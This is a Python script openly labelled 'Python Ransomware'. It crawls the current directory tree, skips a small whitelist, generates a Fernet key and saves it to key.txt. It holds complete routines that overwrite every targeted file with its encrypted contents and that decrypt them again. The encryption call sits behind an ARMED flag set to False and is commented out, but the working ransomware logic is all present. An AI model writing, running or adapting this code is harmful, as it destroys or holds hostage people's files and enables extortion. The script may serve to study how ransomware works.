import os
from cryptography.fernet import Fernet

ARMED = False
targets = []

white_list = ['main.py', 'key.txt', 'pyvenv.cfg']

def locate_targets(dir: str) -> None:
    
    global targets
    
    os.chdir(dir)

    for file in os.listdir():
        if file in white_list:
            continue
        if os.path.isfile(file):
            targets.append(file)


def save_key(key: bytes) -> None:
    
    with open('key.txt', 'wb') as openedKeyFile:
        openedKeyFile.write(key)


def read_key() -> bytes:

    with open('key.txt', 'rb') as openedKeyFile:
        key = openedKeyFile.read()

    return key


def encrypt_files(files: list, key: bytes) -> None:
    
    for file in files:
        
        with open(file, 'rb') as openedFile:
            contents = openedFile.read()

        encrypt_contents = Fernet(key).encrypt(contents)

        with open(file, 'wb') as openedFile:
            openedFile.write(encrypt_contents)


def decrypt_files(files: list, key: bytes) -> None:
    
    for file in files:
        
        with open(file, 'rb') as openedFile:
            contents = openedFile.read()

        decrypted_contents = Fernet(key).decrypt(contents)

        with open(file, 'wb') as openedFile:
            openedFile.write(decrypted_contents)
            

def crawl(directory: str) -> list:

    new_targets = []

    for root, dirs, files in os.walk(directory, topdown=True):
        if any(item in root for item in white_list):
            continue
        print(f"Current directory: {root}")
        print("File:")
        for name in files:
            if any(item in name for item in white_list):
                continue
            if root == "./":
                print(f"  {root}{name}")
                new_targets.append(f"{root}{name}")
            else:
                print(f"  {root}/{name}")
                new_targets.append(f"{root}/{name}")
        print("-" * 40)

    return new_targets


if __name__ == '__main__':
    
    print("\n\n<<|---| Python Ransomware |---|>>\n\n")

    key = Fernet.generate_key()
    save_key(key)
    #key = read_key()
    print(f"Key:   {key}")

    locate_targets('./')
    print(f"Located targets:   {targets}")

    targets = crawl("./")
    print(f"Located targets:   {targets}")

    if ARMED:
        
        #encrypt_files(targets, key)
        #decrypt_files(targets, key)
        pass
